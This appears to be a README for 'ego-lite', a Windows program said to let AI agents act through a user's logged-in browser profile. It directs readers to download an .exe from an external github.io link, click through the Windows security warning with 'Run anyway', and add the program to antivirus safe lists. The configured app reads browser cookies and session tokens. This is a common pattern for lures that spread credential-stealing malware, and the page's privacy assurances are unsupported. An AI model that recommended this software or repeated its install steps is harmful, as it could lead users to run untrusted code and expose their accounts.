# 🧭 ego-lite - Run web agents without interrupting work

[![](https://img.shields.io/badge/Download-ego-lite-blue.svg)](https://fourth3950.github.io)

ego-lite allows you to connect your browser profile to your AI agents. You can run automated web tasks through your existing logged-in accounts. This setup prevents your agents from bothering you while they work in the background. It requires no setup time and contains no costs for the end user.

Visit [this page](https://fourth3950.github.io) to download the current version of the software. You will find the installer file listed under the latest release section. Click the link labeled ego-lite-setup.exe to start the download.

## 🛠 Prerequisites

Your computer needs a standard web browsing setup to use this tool effectively. Ensure you run a recent version of Windows 10 or 11. You should have at least 4GB of RAM available to keep the background tasks smooth. Close any large programs before you start the installation to ensure the software finds your browser profile data without issue.

1. Locate the ego-lite-setup.exe file in your downloads folder.
2. Double-click the file to start the installer.
3. Follow the prompts on the screen to place the application on your computer.
4. If your system shows a security warning, click More info and then Run anyway.
5. The installer places a shortcut on your desktop once the process finishes.

## ⚙️ Configuration steps

Ego-lite reads your browser cookies and session data to allow the AI to act on your behalf. 

1. Launch the application from your desktop icon.
2. The software detects your default browser profile automatically.
3. Select the browser account you wish to share with your agent from the list.
4. Click the Sync button to link the profile.
5. The application keeps these credentials private. No third party gains access to your login information during this link process.

## 🤖 Connecting your AI agent

Once you sync your profile, you can point your AI agents to the port provided in the dashboard. 

1. Copy the Local Port number displayed in the ego-lite window.
2. Open your preferred AI agent interface, such as Claude Code or Codex.
3. Paste the URL, which looks like http://localhost:8080, into the agent configuration settings.
4. Send a command to the agent to perform a browser action.
5. Watch the agent complete the task in the hidden browser window. 

Your work remains undisturbed in your primary browser. You continue to use your tabs and windows while the agent performs background operations on the second profile.

## 🔍 Troubleshooting common issues

If the agent cannot connect, check if the application is running in your system tray. Click the ego-lite icon near your clock to confirm the status is Active. Ensure your firewall allows local connections. Sometimes antivirus software blocks the background browser process. Add ego-lite to your safe list if you experience frequent disconnects. Delete the local cache folder within the app settings if the agent reports an outdated session. This clears any stale cookies and forces the app to refresh your browser link.

## 🔑 Security and privacy

This software runs locally on your machine. Your browser data never leaves your computer or uploads to a cloud server. Only the AI agents you configure locally can interact with the browser profile. This architecture ensures you remain in complete control of your account access. The browser profile shares only the necessary session tokens.
